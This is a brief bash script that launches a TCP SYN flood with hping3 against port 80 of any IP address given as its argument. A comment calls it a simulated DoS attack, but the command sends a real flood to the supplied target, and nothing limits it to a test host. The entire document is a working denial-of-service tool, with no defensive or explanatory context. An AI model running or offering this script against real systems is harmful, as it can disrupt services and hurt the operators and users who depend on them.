#!/bin/bash

# Simulate a DoS attack using hping3
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

target_ip=$1
hping3 -S --flood -p 80 $target_ip
